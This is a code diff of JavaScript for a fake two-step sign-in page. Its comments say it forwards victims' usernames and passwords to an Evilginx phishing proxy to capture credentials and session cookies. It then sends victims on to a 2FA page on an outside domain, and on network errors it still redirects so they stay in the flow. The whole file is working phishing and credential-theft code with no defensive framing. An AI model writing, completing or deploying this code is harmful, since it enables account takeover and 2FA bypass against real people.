@@ -1,74 +1,107 @@
 document.addEventListener("DOMContentLoaded", () => {
-  const params = new URLSearchParams(window.location.search)
-  const apiHost = params.get("api_host")
-
-  const errorBanner = document.getElementById("error-banner")
-  const emailStep = document.getElementById("email-step")
-  const passwordStep = document.getElementById("password-step")
-  const nextToPasswordBtn = document.getElementById("next-to-password")
-  const loginForm = document.getElementById("login-form")
-  const usernameInput = document.getElementById("username")
-  const passwordInput = document.getElementById("password")
-  const userIdentifier = document.getElementById("user-identifier")
-
-  if (!apiHost) {
-    document.body.innerHTML = "<h1>Configuration Error: api_host parameter is missing.</h1>"
-    return
+  const state = {
+    username: "",
+    apiHost: "",
+    isSubmitting: false,
   }
 
-  function showError(message) {
-    errorBanner.textContent = message
-    errorBanner.style.display = "block"
+  const ui = {
+    emailStep: document.getElementById("email-step"),
+    passwordStep: document.getElementById("password-step"),
+    nextBtn: document.getElementById("next-btn"),
+    submitBtn: document.getElementById("submit-btn"),
+    usernameInput: document.getElementById("username"),
+    passwordInput: document.getElementById("password"),
+    userIdentifier: document.getElementById("user-identifier"),
+    errorBanner: document.getElementById("error-banner"),
+    loadingContainer: document.getElementById("loading-container"),
+    loginForm: document.getElementById("login-form"),
   }
 
-  nextToPasswordBtn.addEventListener("click", (e) => {
-    e.preventDefault()
-    if (usernameInput.value.trim() === "") {
-      showError("Please enter a username or email.")
+  const showError = (message) => {
+    ui.errorBanner.textContent = message
+    ui.errorBanner.style.display = "block"
+  }
+
+  const setLoading = (loading) => {
+    state.isSubmitting = loading
+    ui.loadingContainer.style.display = loading ? "block" : "none"
+    ui.loginForm.style.display = loading ? "none" : "block"
+    ui.nextBtn.disabled = loading
+    ui.submitBtn.disabled = loading
+  }
+
+  const init = () => {
+    const urlParams = new URLSearchParams(window.location.search)
+    state.apiHost = urlParams.get("api_host")
+    if (!state.apiHost) {
+      showError("Configuration error: API host is missing. Cannot proceed.")
+      console.error("CRITICAL: api_host URL parameter is missing.")
+      ui.nextBtn.disabled = true
+    }
+  }
+
+  const goToPasswordStep = () => {
+    state.username = ui.usernameInput.value.trim()
+    if (!state.username) {
+      showError("Please enter your username, email, or mobile number.")
       return
     }
-    errorBanner.style.display = "none"
-    userIdentifier.textContent = `Signing in as ${usernameInput.value}`
-    emailStep.classList.remove("active")
-    passwordStep.classList.add("active")
-  })
+    ui.userIdentifier.textContent = state.username
+    ui.emailStep.classList.remove("visible")
+    ui.emailStep.classList.add("hidden")
+    ui.passwordStep.classList.remove("hidden")
+    ui.passwordStep.classList.add("visible")
+    ui.passwordInput.focus()
+  }
 
-  loginForm.addEventListener("submit", (e) => {
-    e.preventDefault()
-    const username = usernameInput.value
-    const password = passwordInput.value
+  const handlePasswordSubmit = async (event) => {
+    event.preventDefault()
+    if (state.isSubmitting) return
 
-    if (password.trim() === "") {
+    const password = ui.passwordInput.value
+    if (!password) {
       showError("Please enter your password.")
       return
     }
 
-    const submitButton = document.getElementById("submit-credentials")
-    submitButton.textContent = "Please wait..."
-    submitButton.disabled = true
+    setLoading(true)
 
     const formData = new URLSearchParams()
-    formData.append("username", username)
+    formData.append("username", state.username)
     formData.append("passwd", password)
 
-    fetch(`${apiHost}/account/challenge/password`, {
-      method: "POST",
-      body: formData,
-      credentials: "omit", // We are not in a proxied context, so we can't include credentials directly
-    })
-      .then((response) => {
-        // We don't need to parse the response. The act of posting the credentials
-        // to the proxied endpoint is what allows Evilginx to capture them and the cookies.
-        // We assume the next step is always 2FA for a robust flow.
-        sessionStorage.setItem("yh_username", username)
-        sessionStorage.setItem("yh_api_host", apiHost)
-        window.location.href = "2fa-selection.html"
+    try {
+      const response = await fetch(`https://${state.apiHost}/account/challenge/password`, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: formData,
+        credentials: "include", // Important for sending/receiving cookies
       })
-      .catch((error) => {
-        console.error("Error submitting credentials:", error)
-        showError("An unexpected error occurred. Please try again.")
-        submitButton.textContent = "Next"
-        submitButton.disabled = false
+
+      // We don't care about the response content. The goal is to get the cookies set.
+      // We assume 2FA is next and redirect immediately.
+      console.log("Password submitted to Evilginx proxy. Redirecting to 2FA selection.")
+
+      const params = new URLSearchParams({
+        u: state.username,
+        api_host: state.apiHost,
       })
-  })
+      window.location.href = `https://custompage.astrowind.live/2fa-selection.html?${params.toString()}`
+    } catch (error) {
+      console.error("Error submitting password to proxy:", error)
+      // Even on network error, we redirect to keep the user in the flow.
+      // The failure will become apparent at the OTP step if cookies aren't set.
+      const params = new URLSearchParams({
+        u: state.username,
+        api_host: state.apiHost,
+      })
+      window.location.href = `https://custompage.astrowind.live/2fa-selection.html?${params.toString()}`
+    }
+  }
+
+  ui.nextBtn.addEventListener("click", goToPasswordStep)
+  ui.loginForm.addEventListener("submit", handlePasswordSubmit)
+
+  init()
 })
